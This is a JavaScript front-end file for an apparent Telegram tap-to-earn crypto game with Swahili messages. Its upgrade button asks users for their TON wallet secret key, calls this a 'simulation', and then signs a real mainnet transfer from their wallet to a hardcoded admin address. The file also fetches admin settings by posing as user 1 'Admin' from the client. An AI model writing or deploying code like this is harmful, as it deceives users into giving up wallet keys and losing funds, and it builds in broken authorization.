// webapp/app.js

let balance = 0;
let level = 0;
let dailyTap = 0;
const maxTap = [5, 25, 60];

const balanceEl = document.getElementById("balance");
const tapBtn = document.getElementById("tapBtn");
const tapMessage = document.getElementById("tapMessage");
const upgradeBtn = document.getElementById("upgradeBtn");
const upgradeMessage = document.getElementById("upgradeMessage");
const refLink = document.getElementById("refLink");
const referralBtn = document.getElementById("referralBtn");
const claimBtn = document.getElementById("claimBtn");
const claimMessage = document.getElementById("claimMessage");

const userId = 12345;
const username = "Guest";

refLink.value = `https://t.me/YOUR_BOT_USERNAME?start=${userId}`;

// ===== Fetch balance =====
async function fetchBalance() {
  const res = await fetch(`/api/balance?userId=${userId}&username=${username}`);
  const data = await res.json();
  balance = data.balance;
  level = data.level;
  dailyTap = data.dailyTap;
  balanceEl.textContent = balance;
}
fetchBalance();

// ===== TAP button =====
tapBtn.addEventListener("click", async () => {
  const res = await fetch("/api/tap?userId=" + userId + "&username=" + username, { method: "POST" });
  const data = await res.json();

  if (!data.success) {
    tapMessage.textContent = data.message;
    return;
  }

  balance = data.balance;
  dailyTap = data.dailyTap;
  balanceEl.textContent = balance;
  tapMessage.textContent = `👏 Umebonyeza! Tap ${dailyTap} ya ${maxTap[level]}`;
});

// ===== UPGRADE button =====
upgradeBtn.addEventListener("click", async () => {
  const levelAmounts = [0.5, 1.5, 3]; // Level 1,2,3 TON
  const tonAmount = levelAmounts[level];
  if (!tonAmount) {
    alert("💤 Level zote tayari zimefunguliwa!");
    return;
  }

  const userWalletKey = prompt("Weka secret key ya wallet yako ya TON (simulation)");
  const adminWallet = "UQDi-2aeyBLfpcdovk7R-cqiJcmn7vk5GXfpEzsr7N4SZha3";

  try {
    const TonWeb = require("tonweb");
    const tonweb = new TonWeb(new TonWeb.HttpProvider("https://mainnet.toncenter.com/api/v2/jsonRPC"));

    const keyPair = TonWeb.utils.keyPairFromSecretKey(userWalletKey);
    const wallet = new TonWeb.wallet.All.v3(tonweb.provider, keyPair);

    // Automatic transfer
    const transfer = await wallet.methods.transfer({
      secretKey: keyPair.secretKey,
      toAddress: adminWallet,
      amount: TonWeb.utils.toNano(tonAmount)
    }).send();

    alert(`🎉 Malipo yametumwa! Transaction hash: ${transfer.id}`);

    // Update backend
    const res = await fetch("/api/upgrade?userId=" + userId + "&username=" + username, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tonPaid: tonAmount, walletAddress: wallet.address })
    });

    const data = await res.json();
    if (data.success) {
      level = data.newLevel;
      dailyTap = 0;
      upgradeMessage.textContent = `🎉 Level ${level} imefunguliwa! Tap limit: ${maxTap[level]}`;
      balanceEl.textContent = balance;
    } else {
      upgradeMessage.textContent = data.message;
    }

  } catch (err) {
    console.error(err);
    alert("💥 Malipo hayakufanikiwa. Jaribu tena.");
  }
});

// ===== REFERRAL button =====
referralBtn.addEventListener("click", async () => {
  const friendId = prompt("Weka Telegram ID ya rafiki:");

  const res = await fetch("/api/referral?userId=" + userId + "&username=" + username, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ friendId })
  });

  const data = await res.json();
  balance = data.balance;
  balanceEl.textContent = balance;
  alert(`🎁 Rafiki ameongezwa! Balance sasa: ${balance}`);
});

// ===== CLAIM button =====
async function fetchAdminSettings() {
  const res = await fetch("/api/admin/settings?userId=1&username=Admin");
  const data = await res.json();
  return data.settings;
}

claimBtn.addEventListener("click", async () => {
  const settings = await fetchAdminSettings();

  if (!settings.claimStatus) {
    claimMessage.textContent = "⚠️ Claim haijaweza kufunguliwa bado. Subiri tangazo la admin.";
    return;
  }

  // Claim logic
  const res = await fetch("/api/claim?userId=" + userId + "&username=" + username, { method: "POST" });
  const data = await res.json();

  if (data.success) {
    claimMessage.textContent = `🎉 Claim imefanikiwa! Balance sasa: ${data.balance}`;
    balance = data.balance;
    balanceEl.textContent = balance;
  } else {
    claimMessage.textContent = data.message;
  }
});

// ===== LIVE CLAIM NOTIFICATION =====
async function checkClaimStatus() {
  const settings = await fetchAdminSettings();

  if (settings.claimStatus) {
    // Create popup if not exists
    if (!document.getElementById("claimPopup")) {
      const popup = document.createElement("div");
      popup.id = "claimPopup";
      popup.style.position = "fixed";
      popup.style.bottom = "20px";
      popup.style.right = "20px";
      popup.style.background = "#fffae6";
      popup.style.border = "2px solid #f5c518";
      popup.style.padding = "15px";
      popup.style.borderRadius = "10px";
      popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.3)";
      popup.style.zIndex = 1000;
      popup.innerHTML = `
        ⚡ Tangazo la Claim! Claim sasa inapatikana. Bonyeza button ya claim ili upate TOKENI. 
        <button id="claimPopupBtn" style="margin-left:10px;padding:5px 10px;">Claim Sasa</button>
      `;
      document.body.appendChild(popup);

      document.getElementById("claimPopupBtn").addEventListener("click", () => {
        claimBtn.click(); // trigger existing claim logic
        popup.remove();
      });
    }
  } else {
    const existing = document.getElementById("claimPopup");
    if (existing) existing.remove();
  }
}

// Check claim status kila 5 sekunde
setInterval(checkClaimStatus, 5000);